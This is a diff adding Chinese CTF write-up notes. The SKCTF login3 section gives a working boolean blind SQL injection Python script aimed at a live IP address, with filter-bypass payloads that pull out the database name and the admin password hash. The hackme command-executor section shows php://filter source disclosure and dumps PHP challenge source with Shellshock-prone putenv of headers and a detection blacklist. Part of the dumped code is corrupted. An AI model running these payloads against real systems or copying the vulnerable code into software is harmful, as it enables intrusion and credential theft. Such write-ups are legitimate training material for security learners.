@@ -2549,3 +2549,256 @@ url --> undefinded
 referer --> localhost/read.php
 
 所以咱们可以看看 config.php 有什么内容
+
+
+
+# SKCTF login3
+	hint: 基于布尔的SQL盲注
+	过滤了：空格 * 常用空格符 + ; union and = ,
+	database() length=8
+	'# 
+	import requests
+
+	str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="
+	re = requests.session()
+	url = 'http://123.206.31.85:49167/index.php'
+
+	def database():
+		res = ''
+		for i in range(1,9):
+			for j in str_all:
+				exp = "admin'^(ascii(mid(database()from({})))<>{})#".format(i, ord(j))
+				data = {
+					'username': exp,
+					'password': 3242
+				}
+				html = re.post(url=url, data=data).text
+				#print(data)
+				if 'error' in html:
+					res += j
+					print(res)
+					break
+		# blindsql
+		# username=admin'^(select(0)from(admin))#&password=fgasrd
+		# 
+
+	def password():
+		res = ''
+		for i in range(1,39):
+			for j in str_all:
+				exp = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})#".format(i, ord(j))  
+				# where(username='admin')
+				data = {
+					'username': exp,
+					'password': 3242
+				}
+				html = re.post(url=url, data=data).text
+				#print(data)
+				if 'error' in html:
+					res += j
+					print(res)
+					break
+
+		# 51b7a76d51e70b419f60d3473fb6f900
+
+	password()
+
+
+# hackme command-exeutor
+	只能执行两个命令 ls / env
+
+	index.php?func=php://filter/read=convert.base64-encode/resource=index
+
+	# index
+	<?php
+	$pages = [
+		['man', 'Man'],
+		['untar', 'Tar Tester'],
+		['cmd', 'Cmd Exec'],
+		['ls', 'List files'],
+	];
+
+	function fuck($msg) {
+		header('Content-Type: text/plain');
+		echo $msg;
+		exit;
+	}
+
+	$black_list = [
+		'\/flag', '\(\)\s*\{\s*:;\s*\};'
+	];
+
+	function waf($a) {
+		global $black_list;
+		if(is_array($a)) {
+			foreach($a as $key => $val) {
+				waf($key);
+				waf($val);
+			}
+		} else {
+			foreach($black_list as $b) {
+				if(preg_match("/$b/", $a) === 1) {
+					fuck("$b detected! exit now.");
+				}
+			}
+		}
+	}
+
+	waf($_SERVER);
+	waf($_GET);
+	waf($_POST);
+
+	function execute($cmd, $shell='bash') {
+		system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
+	}
+
+	foreach($_SERVER as $key => $val) {
+		if(substr($key, 0, 5) === 'HTTP_') {
+			putenv("$key=$val");  // 设置系统变量
+		}
+	}
+
+	$page = '';
+
+	if(isset($_GET['func'])) {
+		$page = $_GET['func'];
+		if(strstr($page, '..') !== false) {
+			$page = '';
+		}
+	}
+
+	if($page && strlen($page) > 0) {
+		try {
+			include("$page.php");
+		} catch (Exception $e) {
+
+		}
+	}
+
+	function render_default() { ?>
+	<?php foreach($pages as list($file, $title)): ?>
+			<li class="nav-item">
+			<a class="nav-link" href="index.php?func=<?=$file?>"><?=$title?></a>
+			</li>
+	<?php endforeach; ?>
+
+		<div class="container"><?php if(is_callable('render')) render(); else render_default(); ?></div>
+	</body>
+	</html>
+
+	
+	<?php
+	function render() {
+		$cmd = '';
+		if(isset($_GET['cmd'])) {
+			$cmd = (string)$_GET['cmd'];
+		}
+	?>
+	<h1>Command Execution</h1>
+	<?php
+		echo '<ul>';
+		$cmds = ['ls', 'env'];
+		foreach($cmds as $c) {
+			printf('<li><a href="index.php?func=cmd&cmd=%s">%1$s<L2E'
+
+
+	# ls
+	<?php
+	function render() {
+		$file = '.';
+		if(isset($_GET['file'])) {
+			$file = (string)$_GET['file'];
+		}
+	
+		$dirs = ['.', '..', '../..', '/etc/passwd'];
+		foreach($dirs as $dir) {
+			printf('<li><a href="index.php?func=ls&file=%s">%1$s</a></li>', $dir);
+		}
+	
+		printf('<h2>$ ls %s</h2>', htmlentities($file));
+	
+		execute(sprintf('ls -l %s', escapeshellarg($file)));
+	}
+	?>
+
+
+
+
+	# untar
+	<?php
+	function render() {
+	?>
+
+	<?php
+		if(isset($_FILES['tarfile'])) {
+			printf('<h2>$ tar -tvf %s</h2>', htmlentities($_FILES['tarfile']['name']));
+
+			execute(sprintf('tar -tvf %s 2>&1', escapeshellarg($_FILES['tarfile']['tmp_name'])));
+		}
+	}
+	?>
+
+
+	# man
+	<?php
+	function render() {
+		$file = 'man';
+		if(isset($_GET['file'])) {
+			$file = (string)$_GET['file'];
+			if(preg_match('/^[\w\-]+$/', $file) !== 1) {
+				echo '<pre>Invalid file name!</pre>';
+				return;
+			}
+		}
+
+		$cmds = ['bash', 'ls', 'cp', 'mv'];
+
+		foreach($cmds as $cmd) {
+			printf('<li><a href="index.php?func=man&file=%s">%1$s</a></li>', $cmd);
+		}
+
+		printf('<h2>$ man %s</h2>', htmlentities($file));
+
+		execute(sprintf('man %s | cat', escapeshellarg($file)));
+	}
+	?>
+
+
+	# cmd
+	<?php
+	function render() {
+		$cmd = '';
+		if(isset($_GET['cmd'])) {
+			$cmd = (string)$_GET['cmd'];
+		}
+	?>
+	<h1>Command Execution</h1>
+	<?php
+		echo '<ul>';
+		$cmds = ['ls', 'env'];
+		foreach($cmds as $c) {
+			printf('<li><a href="index.php?func=cmd&cmd=%s">%1$s</a></li>', $c);
+		}
+	?>
+
+	<script>cmd.focus();</script>
+	<?php
+		if(strlen($cmd) > 0) {
+			printf('<h2>$ %s</h2>', htmlentities($cmd));
+
+			switch ($cmd) {
+			case 'env':
+			case 'ls':
+			case 'ls -l':
+			case 'ls -al':
+				execute($cmd);
+				break;
+			case 'cat flag':
+				echo '<img src="cat-flag.png" alt="cat flag">';
+				break;
+			default:
+				printf('%s: command not found', htmlentities($cmd));
+			}
+		}
+	}
+	?>
